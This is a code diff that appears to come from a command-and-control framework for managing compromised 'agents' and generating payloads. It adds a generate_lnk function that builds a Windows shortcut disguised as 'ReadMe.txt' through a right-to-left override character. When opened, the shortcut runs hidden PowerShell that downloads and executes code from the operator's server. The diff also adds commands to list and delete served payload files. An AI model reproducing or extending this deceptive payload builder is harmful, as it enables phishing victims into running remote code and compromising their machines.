@@ -15,6 +15,7 @@ import time
 import os
 import socket
 from socket import SO_REUSEADDR, SOL_SOCKET
+from urllib.parse import quote,unquote
 from functools import wraps
 from flask import request
 from config import basic_http_username, basic_http_password
@@ -47,7 +48,7 @@ oct_commands = [
     "listen_https", "delete", "generate_powershell", "generate_unmanaged_exe",
     "generate_hta", "generate_macro", "generate_digispark", "delete_listener",
     "generate_spoofed_args_exe", "generate_x86_shellcode",
-    "generate_x64_shellcode", "generate_unicorn_macro"
+    "generate_x64_shellcode", "generate_unicorn_macro","generate_lnk"
     ]
 
 
@@ -274,6 +275,35 @@ def generate(hostname, path, proto, interval):
     print((colored("#====================", "red")))
 
 
+
+def generate_lnk(filename,hostname, path, proto, interval):
+    unicode_str = "%u0052%u0065%u0061%u0064%u004d%u0065%u002e%u202e%u0074%u0078%u0074%u002e%u006c%u006e%u006b"
+    command = "bash mslnk.sh "
+    command += " -l 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'"
+    command += " -a '-w hidden \"IEX (New-Object Net.WebClient).DownloadString('\"'\"{2}://{0}/{1}\\'');\"'".format(hostname, path, proto)
+    command += " -o static/downloads/" + filename
+    result = os.popen(command).read().encode()
+    #fw = open("static/downloads/" + filename, "wb")
+    #fw.write(result)
+    #fw.close()
+    print((colored(f"[+] lnk file generated to {proto}://{hostname}/static/downloads/{filename}", "green")))
+
+
+
+def list_payload_folder():
+    print("\nFiles\n-------")
+    for file in os.listdir("static/downloads/"):
+        print("* " + file)
+
+def remove_file_from_payload_folder(filename):
+    try:
+        os.remove("static/downloads/" + filename)
+        print(colored(f"[+] File successfully deleted: {filename}"))
+    except FileNotFoundError:
+        print(colored("[-] File does not exist in downloads folder !", "red"))
+
+
+
 def generate_hta(host_ip, port, proto):
     print((colored("#====================", "red")))
     print(("mshta " + '{0}://{1}:{2}{3}'.format(proto, host_ip,port, mshta_url)))
@@ -352,7 +382,7 @@ def generate_x64_shellcode(hostname, path, proto_to_use):
     code = template.replace("OCT_URL", full_url)
     code = code.replace("OCTCHAR", char)
     ft.close()
-    fw = open("/tmp/tmpx64.nasm", "w")
+    fw = open("static/downloads/tmpx64.nasm", "w")
     fw.write(code)
     fw.close()
     try:
@@ -485,8 +515,11 @@ def main_help_banner():
     print("banner  \t\t\t\tprint the banner")
     print("clear_history  \t\t\t\tclear history")
     print("list  \t\t\t\t\tlist all connected agents")
+    print("ls  \t\t\t\t\tlist all files in the payloads (downloads) folder")
+    print("rm  \t\t\t\t\tremove a file in the payloads (downloads) folder")
     print("listeners \t\t\t\tlist all listeners")
     print("* generate_powershell \t\t\tgenerate powershell oneliner")
+    print("* generate_lnk \t\t\t\tgenerate an LNK file")
     print("* generate_hta \t\t\t\tgenerate HTA Link")
     print("* generate_unmanaged_exe \t\tgenerate unmanaged executable agent")
     print("* generate_spoofed_args_exe \t\tgenerate executable that fake the powerhell oneliner args")
